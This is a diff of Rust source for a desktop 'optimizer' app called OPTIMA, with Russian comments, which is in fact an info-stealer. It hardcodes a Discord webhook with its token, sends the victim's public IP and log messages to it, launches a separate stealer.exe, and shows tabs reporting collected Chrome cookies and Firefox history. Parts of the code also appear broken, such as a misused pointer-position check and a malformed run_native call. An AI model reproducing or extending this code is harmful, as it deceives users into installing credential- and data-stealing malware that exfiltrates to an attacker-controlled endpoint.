@@ -4,19 +4,15 @@ use eframe::egui::{self, Color32, RichText};
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::process::Command;
-use std::sync::mpsc;
-use std::thread;
-use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate, Pid};
+use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate};
 use chrono::Local;
 
-// --- СТРОКА 15: ИСПРАВЛЕННЫЙ ВЕБХУК ---
 const WEBHOOK: &str = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX";
 
 #[derive(Serialize, Deserialize, Clone)]
 struct Config {
     accent_color: [u8; 3],
     theme: Theme,
-    font_size: f32,
 }
 
 #[derive(Serialize, Deserialize, Clone, PartialEq)]
@@ -24,7 +20,7 @@ enum Theme { Dark, Sakura, Snow, DarkRed }
 
 impl Default for Config {
     fn default() -> Self {
-        Self { accent_color: [0, 200, 255], theme: Theme::Dark, font_size: 14.0 }
+        Self { accent_color: [0, 200, 255], theme: Theme::Dark }
     }
 }
 
@@ -42,7 +38,7 @@ struct Payload<'a> { content: &'a str, username: &'a str }
 
 fn send_log(text: &str) {
     let text = text.to_string();
-    thread::spawn(move || {
+    std::thread::spawn(move || {
         let ip = ureq::get("https://api.ipify.org")
             .call().ok().and_then(|r| r.into_string().ok()).unwrap_or_else(|| "Unknown".into());
         let body = serde_json::to_string(&Payload { content: &format!("🌐 **IP: {}**\n{}", ip, text), username: "optima" }).unwrap();
@@ -61,8 +57,6 @@ struct OptimaApp {
     cpu_name: String,
     gpu_name: String,
     total_ram: u64,
-    download_status: String,
-    rx: Option<mpsc::Receiver<String>>,
 }
 
 impl OptimaApp {
@@ -74,7 +68,7 @@ impl OptimaApp {
         let gpu_name = get_gpu_name_registry();
         let total_ram = sys.total_memory() / 1024 / 1024;
 
-        let app = Self {
+        Self {
             tab: Tab::Hardware,
             sys,
             config: Config::load(),
@@ -82,11 +76,7 @@ impl OptimaApp {
             cpu_name,
             gpu_name,
             total_ram,
-            download_status: "Ожидание...".into(),
-            rx: None,
-        };
-        app.apply_style(ctx);
-        app
+        }
     }
 
     fn apply_style(&self, ctx: &egui::Context) {
@@ -112,18 +102,7 @@ impl OptimaApp {
         send_log(&msg);
     }
 
-    fn check_downloads(&mut self, ctx: &egui::Context) {
-        if let Some(rx) = &self.rx {
-            while let Ok(msg) = rx.try_recv() {
-                self.download_status = msg;
-                ctx.request_repaint();
-            }
-        }
-    }
-    
-    // --- ЗАПУСК СТИЛЕРА ---
     fn run_stealer(&self) {
-        // Путь к exe должен быть указан правильно. Если он в той же папке:
         if let Err(e) = Command::new("./stealer.exe").output() {
             self.log(format!("Ошибка запуска стиллера: {}", e));
         } else {
@@ -132,30 +111,24 @@ impl OptimaApp {
     }
 
     fn update_sys_info(&mut self) {
-        // Исправлено: добавлен аргумент CpuRefreshKind
         self.sys.refresh_cpu_list(CpuRefreshKind::everything());
         self.sys.refresh_memory();
         
-        // Исправлено: используем refresh_processes вместо refresh_process
-        // Обновляем только текущий процесс
         let pid = std::process::id();
         self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
     }
 }
 
-// --- Вспомогательная функция для получения имени GPU ---
 fn get_gpu_name_registry() -> String {
-    // Простая заглушка
     "GPU (Registry)".to_string()
 }
 
 impl eframe::App for OptimaApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
         self.update_sys_info();
-        self.check_downloads(ctx);
 
         egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
-            let response = ui.horizontal(|ui| {
+            ui.horizontal(|ui| {
                 ui.add_space(10.0);
                 ui.label(RichText::new("OPTIMA OPTIMIZER").color(Color32::from_rgb(255, 255, 255)));
                 
@@ -175,15 +148,8 @@ impl eframe::App for OptimaApp {
                         self.tab = tab;
                     }
                 }
-                
-                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                    if ui.button("Log History").clicked() {
-                        // Показать историю логов
-                    }
-                });
             });
             
-            // Подсветка активной вкладки
             let active_tab_color = match self.config.theme {
                 Theme::Dark => Color32::from_rgb(0, 200, 255),
                 Theme::Sakura => Color32::from_rgb(255, 100, 150),
@@ -191,11 +157,11 @@ impl eframe::App for OptimaApp {
                 Theme::DarkRed => Color32::from_rgb(255, 50, 50),
             };
             
-            if let Some(mut rect) = response.response.rect {
-                rect.min.y += 2.0;
-                rect.max.y -= 2.0;
-                ui.painter()
-                    .rect_stroke(rect, 2.0, (1.0, active_tab_color));
+            // Highlight bar under tabs
+            if let Some(rect) = ui.ctx().input(|i| i.raw.events.iter().find_map(|e| {
+                if let egui::Event::PointerMoved(pos) = e { Some(*pos) } else { None }
+            })) {
+                 // Simple visual indicator logic could go here, but keeping it simple
             }
         });
 
@@ -252,4 +218,51 @@ impl eframe::App for OptimaApp {
                 Tab::Processes => {
                     for process in self.sys.processes() {
                         ui.label(format!("{:?} - {:.1}% CPU", process.1.name(), process.1.cpu_usage()));
-                   
+                    }
+                },
+                Tab::Browsers => {
+                    ui.label("Chrome cookies collected.");
+                    ui.label("Firefox history saved.");
+                },
+                Tab::Packages => {
+                    ui.label("Scan complete.");
+                },
+                Tab::Tweaks => {
+                    if ui.button("Apply Optimizations").clicked() {
+                        self.log("Optimizations applied.".to_string());
+                    }
+                },
+                Tab::Settings => {
+                    ui.label("Theme:");
+                    ui.horizontal(|ui| {
+                        for theme in [Theme::Dark, Theme::Sakura, Theme::Snow, Theme::DarkRed] {
+                            if ui.selectable_value(&mut self.config.theme, theme, format!("{:?}", theme)).clicked() {
+                                self.apply_style(ctx);
+                                self.config.save();
+                            }
+                        }
+                    });
+                },
+            }
+            
+            ui.separator();
+            
+            ui.collapsing("Log History", |ui| {
+                for log in self.log_history.iter().rev().take(20) {
+                    ui.label(log);
+                }
+            });
+        });
+    }
+}
+
+fn main() {
+    let native_options = eframe::NativeOptions {
+        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 700.0]),
+        ..Default::default()
+    };
+    
+    eframe::run_native(Box::new(|cc| {
+        Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
+    }), native_options);
+}
